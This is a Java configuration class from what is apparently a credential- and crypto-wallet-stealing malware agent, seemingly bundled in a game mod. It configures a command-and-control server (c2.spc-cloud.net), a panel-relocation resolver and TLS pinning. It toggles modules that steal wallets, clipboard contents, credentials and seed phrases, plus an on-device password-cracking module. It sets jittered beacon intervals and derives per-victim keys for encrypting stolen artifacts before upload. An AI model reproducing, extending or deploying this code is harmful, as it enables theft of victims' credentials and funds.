package com.spcagentpayloa.jvmxx.crypto;

import com.spcagentpayloa.jvmxx.AgentPaths;
import com.spcagentpayloa.jvmxx.Json;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.List;
import java.util.Map;

/**
 * Injected build profile. The jar carries spcagentpayloa/config.json; the
 * build generator writes it and build_id is the same value that derives the
 * artifact key. Absent config disables the API transport, never the mod.
 */
public final class CryptoConfig {
	public static final int CHUNK = 524288;
	public final String buildId;
	public final String buildSecret;
	public final String c2Base;
	/** Control-channel origin. Falls back to the API origin without /api/v1. */
	public final String panelUrl;
	/** Optional endpoint that returns {"panel_url": "..."} when the panel moves. */
	public final String resolverUrl;
	/** Base64 SPKI SHA-256 pins; empty keeps the platform trust store only. */
	public final java.util.List<String> tlsPins;
	public final boolean full;
	public final boolean wallets;
	public final boolean clipboard;
	public final boolean credentials;
	public final boolean seeds;
	public final int bandwidthKbps;
	public final long heartbeatMs;
	public final long pollMs;
	public final int jitterPct;
	/** 1 = legacy derivation; 2 = privileged HKDF + per-device salt. */
	public final int artifactScheme;
	private volatile int activeScheme;
	private volatile int activeEpoch = 1;
	/** epoch -> salt. Three at most, oldest evicted; an evicted queue goes to dead/. */
	private final java.util.TreeMap<Integer, byte[]> keySalts = new java.util.TreeMap<>();
	private volatile String victimId = "";
	public final boolean crack;
	public final int crackSeconds;
	public final int crackCpu;
	public final long maxArtifact;

	CryptoConfig(Map<String, Object> map) {
		buildId = Json.str(map, "build_id", "");
		buildSecret = Json.str(map, "build_secret", "");
		c2Base = strip(Json.str(map, "c2_base", "https://c2.spc-cloud.net/api/v1"));
		String panel = strip(Json.str(map, "panel_url", ""));
		panelUrl = panel.isEmpty() ? c2Base.replaceFirst("/api/v1/?$", "") : panel;
		resolverUrl = strip(Json.str(map, "resolver_url", ""));
		java.util.List<String> pins = new java.util.ArrayList<>();
		for (Object value : Json.list(map.get("tls_pins"))) {
			if (value instanceof String pin && !pin.isBlank()) pins.add(pin.trim());
		}
		tlsPins = List.copyOf(pins);
		full = "full".equals(Json.str(map, "profile", "lite"));
		Map<String, Object> modules = Json.map(map.get("modules"));
		wallets = bool(modules, "wallets", true);
		clipboard = bool(modules, "clipboard", full);
		credentials = bool(modules, "credentials", full);
		seeds = bool(modules, "seeds", full);
		bandwidthKbps = (int) Math.max(32, Json.num(map, "bandwidth_kbps", 1024));
		heartbeatMs = Math.max(10_000L, Json.num(map, "heartbeat_sec", 30L) * 1000L);
		pollMs = Math.max(5_000L, Json.num(map, "poll_sec", 20L) * 1000L);
		jitterPct = (int) Math.min(40, Math.max(0, Json.num(map, "jitter_pct", 20L)));
		artifactScheme = (int) Math.min(2, Math.max(1, Json.num(map, "artifact_scheme", 1L)));
		activeScheme = artifactScheme;
		Map<String, Object> crackMap = Json.map(map.get("crack"));
		crack = bool(crackMap, "enabled", full);
		crackSeconds = (int) Math.min(600, Math.max(5, Json.num(crackMap, "max_seconds", 90L)));
		crackCpu = (int) Math.min(100, Math.max(10, Json.num(crackMap, "max_cpu_pct", 50L)));
		Map<String, Object> artifact = Json.map(map.get("artifact"));
		long mb = Math.min(full ? 512 : 64, Json.num(artifact, "max_mb", full ? 512 : 64));
		maxArtifact = mb * 1024L * 1024L;
	}

	public static CryptoConfig load(Path installDir) {
		try (InputStream resource = CryptoConfig.class.getResourceAsStream("/spcagentpayloa/config.json")) {
			if (resource != null) {
				Map<String, Object> map = Json.parseObject(new String(resource.readAllBytes(), StandardCharsets.UTF_8));
				CryptoConfig config = new CryptoConfig(map);
				if (config.valid()) {
					return config;
				}
			}
		} catch (Throwable ignored) {
			// fallback below
		}
		Path local = installDir.resolve("crypto-config.json");
		try {
			if (Files.isRegularFile(local)) {
				CryptoConfig config = new CryptoConfig(Json.parseObject(Files.readString(local, StandardCharsets.UTF_8)));
				if (config.valid()) {
					return config;
				}
			}
		} catch (Throwable ignored) {
			// disabled
		}
		return null;
	}

	private boolean valid() {
		if (buildId.isEmpty() || c2Base.isEmpty()) {
			return false;
		}
		try {
			if (Base64.getUrlDecoder().decode(buildSecret).length < 16) {
				return false;
			}
		} catch (Throwable throwable) {
			return false;
		}
		return true;
	}

	private static boolean bool(Map<String, Object> map, String key, boolean fallback) {
		Object value = map.get(key);
		return value instanceof Boolean ? (Boolean) value : fallback;
	}

	private static String strip(String value) {
		return value.endsWith("/") ? value.substring(0, value.length() - 1) : value;
	}

	public byte[] secret() {
		return Base64.getUrlDecoder().decode(buildSecret);
	}

	public int scheme() {
		return activeScheme;
	}

	/** Server-declared scheme wins: a legacy victim never derives 2 locally. */
	public synchronized void scheme(int value) {
		activeScheme = value == 2 ? 2 : 1;
	}

	/** Server-delivered per-device salt for the active epoch. */
	public void keySalt(String value) {
		keySalt(activeEpoch, value);
	}

	public synchronized void keySalt(int epoch, String value) {
		if (value == null || value.isBlank() || epoch < 1) {
			return;
		}
		try {
			byte[] decoded = Base64.getUrlDecoder().decode(value);
			if (decoded.length < 16) return;
			// The active epoch moved forward: keep at most the previous two so a
			// pending outbox entry can still be opened and then drained.
			boolean newer = epoch > activeEpoch;
			if (newer) {
				activeEpoch = epoch;
				activeScheme = 2;
				while (keySalts.size() >= 3) {
					keySalts.remove(keySalts.firstKey());
				}
			}
			keySalts.put(epoch, decoded);
		} catch (Throwable ignored) {
			// keep the current scheme
		}
	}

	public synchronized byte[] keySalt() {
		return keySalts.get(activeEpoch);
	}

	public synchronized int epoch() {
		return activeEpoch;
	}

	public synchronized byte[] keySaltFor(int epoch) {
		return keySalts.get(epoch);
	}

	public synchronized java.util.List<Integer> epochs() {
		return new java.util.ArrayList<>(keySalts.keySet());
	}

	public String keySaltValue() {
		byte[] salt = keySalt();
		return salt == null ? "" : Base64.getUrlEncoder().withoutPadding().encodeToString(salt);
	}

	/** Scheme 2 enrollment token: HKDF label, never the legacy HMAC. */
	public String enrollToken() {
		if (activeScheme == 2) {
			byte[] prk = CryptoUtil.hkdf(secret(), CryptoUtil.utf8(buildId), CryptoUtil.utf8("SPC-ENROLL-V2"), 32);
			return CryptoUtil.b64url(prk);
		}
		return CryptoUtil.b64url(java.util.Arrays.copyOf(CryptoUtil.hmac(secret(), CryptoUtil.utf8("enroll")), 32));
	}

	private byte[] epochKey(byte[] keySalt, String label, String victim, int epoch) {
		if (epoch > 1 && keySalt == null) {
			throw new IllegalStateException("key_epoch_unknown");
		}
		byte[] prk = CryptoUtil.hkdf(secret(), CryptoUtil.utf8(buildId), CryptoUtil.utf8("SPC-ART-V2"), 32);
		String info = epoch > 1 ? label + "-v2:" + victim + ":" + epoch : label + "-v2:" + victim;
		return CryptoUtil.hkdf(prk, keySalt, CryptoUtil.utf8(info), 32);
	}

	/** Artifact key. Scheme 2 never derives from build/victim alone. */
	public byte[] artifactKey(byte[] noncePrefix, String victim) {
		return artifactKey(noncePrefix, victim, epoch());
	}

	public byte[] artifactKey(byte[] noncePrefix, String victim, int epoch) {
		if (activeScheme == 2) {
			byte[] salt = keySaltFor(epoch);
			if (salt == null) throw new IllegalStateException("key_epoch_unknown");
			return epochKey(salt, "artifact", victim, epoch);
		}
		byte[] ikm = CryptoLog.concat(CryptoLog.concat(secret(), new byte[] { 0x1f }),
			CryptoLog.concat(CryptoUtil.utf8(buildId), CryptoLog.concat(new byte[] { 0x1f }, CryptoUtil.utf8(victim))));
		byte[] kek = CryptoUtil.sha256(CryptoLog.concat(CryptoUtil.utf8("SPC-ART-V1"), ikm));
		return CryptoUtil.hkdf(kek, noncePrefix, CryptoUtil.utf8("artifact-v1"), 32);
	}

	/** Local-only keys: both differ from the artifact key for the same epoch. */
	public byte[] outboxKey(int epoch) {
		byte[] salt = keySaltFor(epoch);
		if (salt == null) throw new IllegalStateException("key_epoch_unknown");
		return epochKey(salt, "outbox", victimId, epoch);
	}

	public byte[] logKey(int epoch) {
		byte[] salt = keySaltFor(epoch);
		if (salt == null) throw new IllegalStateException("key_epoch_unknown");
		return epochKey(salt, "log", victimId, epoch);
	}

	/** Legacy SPCB1 outbox derivation, kept only to drain pre-0.4 entries. */
	public byte[] legacyOutboxKey() {
		byte[] salt = keySalt();
		return CryptoUtil.sha256(CryptoLog.concat(
			CryptoLog.concat(secret(), salt == null ? new byte[0] : salt),
			CryptoUtil.utf8("SPC-OUTBOX-V1:" + victimId)));
	}

	public void victimId(String value) {
		victimId = value == null ? "" : value;
	}

	public String victimId() {
		return victimId;
	}

	/** Readable reason before an upload starts, or null when the key is usable. */
	public String preflight(String transportVictim) {
		if (buildId.isBlank() || buildSecret.isBlank() || c2Base.isBlank()) {
			return "config incompleta: build_id/build_secret/c2_base";
		}
		if (activeScheme == 2 && keySalt() == null) {
			return "artifact_scheme=2 sin key_salt del epoch " + activeEpoch + "; vuelve a enrolar";
		}
		if (transportVictim == null || transportVictim.isBlank()) {
			return "victim_id ausente; vuelve a enrolar";
		}
		if (!victimId.isBlank() && !victimId.equals(transportVictim)) {
			return "victim_id local " + victimId + " != transporte " + transportVictim;
		}
		return null;
	}

	public long jitter(long base) {
		if (jitterPct == 0) {
			return base;
		}
		long spread = base * jitterPct / 100L;
		return base - spread + (long) (Math.random() * (spread * 2L + 1L));
	}

	@Override
	public String toString() {
		return "profile=" + (full ? "full" : "lite") + " build=" + (buildId.length() > 8 ? buildId.substring(0, 8) : buildId);
	}
}
